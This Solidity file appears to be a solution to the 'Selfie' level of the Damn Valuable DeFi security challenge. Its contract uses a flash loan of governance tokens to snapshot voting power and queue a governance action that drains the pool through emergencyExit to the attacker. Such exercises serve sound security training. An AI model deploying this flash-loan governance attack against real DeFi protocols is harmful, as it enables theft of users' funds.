// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/ISimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    address private attacker;
    SelfiePool private target;
    ISimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot private damnValuableToken;

    uint256 public actionId;

    constructor(SelfiePool _target, ISimpleGovernance simpleGovernanceAddress, DamnValuableTokenSnapshot damnValuableTokenAddress) {
        attacker = msg.sender;
        target = _target;
        simpleGovernance = simpleGovernanceAddress;
        damnValuableToken = damnValuableTokenAddress;
    }

    function attack(uint256 amount) external {
        bytes memory data = abi.encodeWithSelector(SelfiePool.emergencyExit.selector, attacker);
        target.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amount, data);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32)
    {
        require(initiator == address(this), "permission denied");
        require(DamnValuableTokenSnapshot(token).balanceOf(address(this)) == amount, "not enough gov");
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = simpleGovernance.queueAction(address(target), 0, data);
        DamnValuableTokenSnapshot(token).approve(address(target), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}